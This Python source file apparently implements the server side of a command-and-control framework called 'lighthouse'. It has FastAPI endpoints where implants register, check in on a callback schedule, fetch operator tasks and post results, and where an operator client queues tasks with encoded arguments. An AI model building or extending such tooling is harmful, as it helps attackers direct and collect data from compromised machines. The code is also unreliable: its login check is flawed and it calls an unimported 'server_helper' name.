#!/usr/bin/python3
import argparse
import base64
import binascii
import uvicorn

from jose import JWTError, jwt
from datetime import datetime, timedelta, timezone
from typing import List

from fastapi import FastAPI, HTTPException, status, Depends, Security
from fastapi.security import OAuth2PasswordRequestForm
from fastapi.responses import RedirectResponse

# local imports
from server_helper.auth_helper import Token, oauth2_scheme
from server_helper.auth_helper import SECRET_KEY, ALGORITHM, ACCESS_TOKEN_EXPIRE_MINUTES

from server_helper.user_helper import Users, UserCreate, UserRead, UserDelete
from server_helper.db import Base, SessionLocal

from server_helper.db import get_db
from server_helper.auth_helper import verify_token
from server_helper.auth_helper import create_access_token

from server_helper.implant_helper import Implant, ImplantCreate, ImplantRead
from server_helper.tasking_helper import (
    Tasking,
    TaskingCreate,
    TaskingRead,
    TaskingDelete,
)

from server_helper.results_helper import (
    Results,
    ResultsCreate,
    ResultsRead,
    ResultsDelete,
)

from server_helper.lighthouse_config import *

app = FastAPI()
from routes.user_routes import router as user_router
app.include_router(user_router)

# for client only to be able to access protected endpoints, authentication via OAuth2
@app.post("/token/", response_model=Token)
def login(
    db: SessionLocal = Depends(get_db),  # type: ignore
    form_data: OAuth2PasswordRequestForm = Depends(),
):
    user_exists = (
        db.query(Users)
        .filter(
            Users.username == form_data.username
            and Users.password == form_data.password
        )
        .first()
    )
    if not user_exists:
        raise HTTPException(status_code=401, detail="Invalid username or password")
    access_token = server_helper.create_access_token(data={"sub": form_data.username})
    return {"access_token": access_token, "token_type": "bearer"}


# PROTECTED endpoint for clients to retrieve result based on session id and tasking id
@app.get("/results/{session}/{id}", response_model=ResultsRead)
def read_result(
    session: str,
    id: int,
    db: SessionLocal = Depends(get_db),  # type: ignore
    token: str = Security(oauth2_scheme),
):
    """
    Provide results of a tasking to the merchant client.
    :param session: The session id of the agent to retrieve tasking
    :param id: The id of the tasking that merchant wants results for
    :param db: The connection to the database
    :param token: The jwt authentication token used to auth to lighthouse
    :return db_result: The result of the tasking provided back in json format
    """
    server_helper.verify_token(token)
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")
    db_result = (
        # this was a bad bug
        # db.query(Results).filter(Results.session == session, Results.id == id).first()
        db.query(Results)
        .filter(Results.session == session, Results.tasking_id == id)
        .first()
    )
    if db_result is None:
        raise HTTPException(status_code=416, detail="Result out of range")
    return db_result


# recieve tasking output from agent based on session id, marks task complete = True
@app.post("/results/{session}", response_model=ResultsCreate)
def create_results(
    session: str, results: ResultsCreate, db: SessionLocal = Depends(get_db)  # type: ignore
):
    """
    The endpoint where agents will send result output back to the lighthouse server
    :param session: The session id tied to the results being sent
    :param results: The results of the provided tasking
    :param db: The db connection to the sqlite database
    :return db_task: The successful tasking result or 404 if the session is not found
    or 400 if the results are not properly formatted
    """
    current_time = datetime.now(timezone.utc).isoformat()
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")
    if results.args:
        try:
            args_bytes = bytes.fromhex(results.args)
            decoded_args = base64.b64decode(args_bytes.decode("utf-8")).decode("utf-8")
        except (binascii.Error, UnicodeDecodeError, ValueError) as e:
            raise HTTPException(status_code=400, detail=f"Invalid encoded args: {e}")
    else:
        decoded_args = ""
    results_data = results.model_dump(exclude={"session", "date"})
    results_data["args"] = decoded_args

    if results_data["task"] == "reconfig":
        update_callback_freq(session, results_data, db)
        # new_callback_freq = results_data["args"].split(" ")[0]
    # need to update callback interval...
    # implant = db.query(Implant).filter(Implant.session == session).first()
    # if implant is not None and implant.alive:
    #    implant.callback_freq = new_callback_freq
    #    db.commit()
    #    db.refresh(implant)

    # you will need to decode the results eventually
    db_task = Results(**results_data, session=session, date=current_time)
    db.add(db_task)
    db.commit()
    db.refresh(db_task)
    # Mark the task as complete (break this out into its own function later)
    db_tasking = (
        db.query(Tasking)
        .filter(Tasking.session == session, Tasking.id == results.tasking_id)
        .first()
    )
    if db_tasking:
        db_tasking.complete = "True"
        db.commit()
        db.refresh(db_tasking)
    else:
        print("Task not found, cannot update completion status in the tasking table.")
        raise HTTPException(status_code=404, detail="Task not found")
    return db_task


def update_callback_freq(session: str, results_data: dict, db: SessionLocal = Depends(get_db)):  # type: ignore
    new_callback_freq = results_data["args"].split(" ")[0]
    implant = db.query(Implant).filter(Implant.session == session).first()
    if implant is not None and implant.alive:
        implant.callback_freq = new_callback_freq
        db.commit()
        db.refresh(implant)


# PROTECTED endpoint in order to create a task for an implant (client -> server)
@app.post("/tasking/{session}", response_model=TaskingCreate)
def create_tasking(
    session: str,
    tasking: TaskingCreate,
    db: SessionLocal = Depends(get_db),  # type: ignore
    token: str = Security(oauth2_scheme),
):
    """
    The endpoint where merchant will submit tasking requests to lighthouse for the agent to pick up and action
    :param session: The session id we should associate with for the tasking request
    :param tasking: The json blob containing the valid tasking request
    :param db: The active database connection
    :param token: The token used to authenticate a merchant to lighthouse
    :return db_task: The json tasking information, 404 if the session is not found, 400 if the
    arguments are not valid for the tasking request
    """
    server_helper.verify_token(token)
    current_time = datetime.now(timezone.utc).isoformat()
    # Check if the session exists
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")

    # Decode the arguments from base64(hex) if provided
    if tasking.args:
        try:
            args_bytes = bytes.fromhex(tasking.args)
            decoded_args = base64.b64decode(args_bytes.decode("utf-8")).decode("utf-8")
        except (binascii.Error, UnicodeDecodeError, ValueError) as e:
            raise HTTPException(status_code=400, detail=f"Invalid encoded args: {e}")
    else:
        decoded_args = ""
    # Dump model data excluding fields that will be manually set
    tasking_data = tasking.model_dump(exclude={"session", "complete", "date"})
    # Override 'args' with decoded version
    tasking_data["args"] = decoded_args
    # Create new task
    db_task = Tasking(
        **tasking_data, session=session, date=current_time, complete="False"
    )
    db.add(db_task)
    db.commit()
    db.refresh(db_task)
    return db_task


# PROTECTED endpoint for client to retrieve taskings
@app.get("/tasking/{session}", response_model=List[TaskingRead])
def read_taskings(
    session: str,
    db: SessionLocal = Depends(get_db),  # type: ignore
    token: str = Security(oauth2_scheme),
):
    server_helper.verify_token(token)
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")

    tasking = (
        db.query(Tasking)
        .filter(
            Tasking.session == session,
            Tasking.complete.in_(["False", "Pending", "True"]),
        )
        .all()
    )
    return tasking


# endpoint for agent initial checkin, register with server for future tasking/results/tracking
@app.post("/implants/", response_model=ImplantRead)
def create_implant(implant: ImplantCreate, db: SessionLocal = Depends(get_db)):  # type: ignore
    current_time = datetime.now(timezone.utc).isoformat()

    implant_data = implant.model_dump(
        exclude={"alive", "first_checkin", "last_checkin"}
    )
    db_implant = Implant(
        **implant_data,
        alive=True,
        first_checkin=current_time,
        last_checkin=current_time,
    )

    db.add(db_implant)
    db.commit()
    db.refresh(db_implant)
    return db_implant


# PROTECTED endpoint for clients only to be able to view all implants
@app.get("/implants/", response_model=List[ImplantRead])
def read_implants(
    db: SessionLocal = Depends(get_db),  # type: ignore
    token: str = Security(oauth2_scheme),
):
    server_helper.verify_token(token)
    implants = db.query(Implant).all()
    return implants


# PROTECTED endpoint for clients to be able to view a single implant by session
@app.get("/implants/{session}", response_model=ImplantRead)
def read_single_implant(
    session: str,
    db: SessionLocal = Depends(get_db),  # type: ignore
    token: str = Security(oauth2_scheme),
):
    server_helper.verify_token(token)
    implant = db.query(Implant).filter(Implant.session == session).first()
    if implant is None:
        raise HTTPException(status_code=404, detail="Session not found")
    # check if alive
    if not implant.alive:
        raise HTTPException(
            status_code=410, detail="Implant is dead or has been killed"
        )
    return implant


# endpoint for agent to deregister itself, mark as dead (agent makes best effort to call endpoint when sudden death occurs)
@app.get("/health/d/{session}", response_model=ImplantCreate)
def deregister_implant(session: str, db: SessionLocal = Depends(get_db)):  # type: ignore
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if db_implant is None:
        raise HTTPException(status_code=404, detail="Session not found")
    # implant session exists change alive to False
    db_implant.alive = False
    db_implant.last_checkin = datetime.now(timezone.utc).isoformat()
    db.commit()
    db.refresh(db_implant)
    return db_implant


# implant checkin endpoint
@app.get("/health/{session}", response_model=ImplantCreate)
def check_in(session: str, db: SessionLocal = Depends(get_db)):  # type: ignore
    check_in_time = datetime.now(timezone.utc).isoformat()

    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if db_implant is None:
        raise HTTPException(status_code=404, detail="Session not found")
    db_implant.last_checkin = check_in_time
    db.commit()
    db.refresh(db_implant)

    pending_tasks = (
        db.query(Tasking)
        .filter(Tasking.session == session, Tasking.complete == "False")
        .all()
    )

    if pending_tasks:
        return RedirectResponse(f"/tasks/{session}", status_code=301)

    # no pending tasks all completed=True
    return db_implant


# endpoint for agent to retrieve tasks, mark them as pending after agent picks them up
@app.get("/tasks/{session}", response_model=List[TaskingRead])
def get_tasks(session: str, db: SessionLocal = Depends(get_db)):  # type: ignore
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if db_implant is None:
        raise HTTPException(status_code=404, detail="Session not found")

    tasking = (
        db.query(Tasking)
        .filter(Tasking.session == session, Tasking.complete.in_(["False", "Pending"]))
        .all()
    )
    if not tasking:
        raise HTTPException(status_code=404, detail="No tasks found for this session")
    # Mark tasks as pending
    for task in tasking:
        # implant picked it up for action
        task.complete = "Pending"
        db.commit()
        db.refresh(task)

    return tasking


if __name__ == '__main__':
    opts = argparse.ArgumentParser(description="light_house server application")
    opts.add_argument("-c", "--config", help="the light_house config file containing runtime variables", required=True, type=str, default="lighthouse.conf", dest="config")
    args = opts.parse_args()
    
    conf = parse_config(args.config)
    web_server = parse_config_vals(conf)
    uvicorn.run(app, host=web_server.listen_host, port=web_server.listen_port, ssl_certfile=web_server.server_crt, ssl_keyfile=web_server.server_key)

